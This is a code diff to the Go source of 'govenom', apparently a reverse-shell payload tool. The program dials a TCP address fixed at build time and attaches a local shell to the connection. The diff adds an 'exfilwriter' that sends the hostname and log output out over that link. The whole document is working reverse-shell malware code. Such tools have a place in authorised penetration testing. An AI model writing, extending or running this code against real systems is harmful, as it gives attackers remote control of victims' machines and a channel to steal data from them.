@@ -2,21 +2,25 @@ package main
 
 import (
 	"fmt"
-	"govenom/debuglog"
+	"log"
 	"net"
+	"os"
 	"os/exec"
+
+	"govenom/exfilwriter"
 )
 
 var (
 	// set during compilation/linking via -X ldflag
 	address      string
-	debugCfg     string
+	network      string
+	exfilCfg     string
 	noWindowsGui string
-	shellBinary  string
+	shell        string
 )
 
 func determineShellBinary(candidates []string) (string, error) {
-	candidates = append([]string{shellBinary}, candidates...)
+	candidates = append([]string{shell}, candidates...)
 	for _, candidate := range candidates {
 		binary, err := exec.LookPath(candidate)
 		if err != nil {
@@ -47,18 +51,22 @@ func attachShell(binaryPath string, con net.Conn) error {
 }
 
 func main() {
-	log, errs := debuglog.New(debugCfg)
+	w, errs := exfilwriter.New(exfilCfg)
+	hostname, err := os.Hostname()
+	if err != nil {
+		hostname = "unknown"
+	}
+	log := log.New(w, fmt.Sprintf("%s: ", hostname), 0)
 
-	con, err := net.Dial("tcp", address)
+	conn, err := net.Dial(network, address)
 	if err != nil {
 		log.Fatal(err)
 	}
-
-	log.AddExfiltrator(con)
+	w.AddExfiltrator(conn)
 	// send out debuglog configuration errors *at least* over TCP
 	if len(errs) > 0 {
 		for _, err := range errs {
-			log.Fatal(err)
+			log.Println(err)
 		}
 	}
 
@@ -69,7 +77,7 @@ func main() {
 
 	log.Printf("Using Shell: %s\n", binaryPath)
 
-	err = attachShell(binaryPath, con)
+	err = attachShell(binaryPath, conn)
 	if err != nil {
 		log.Fatal(err)
 	}
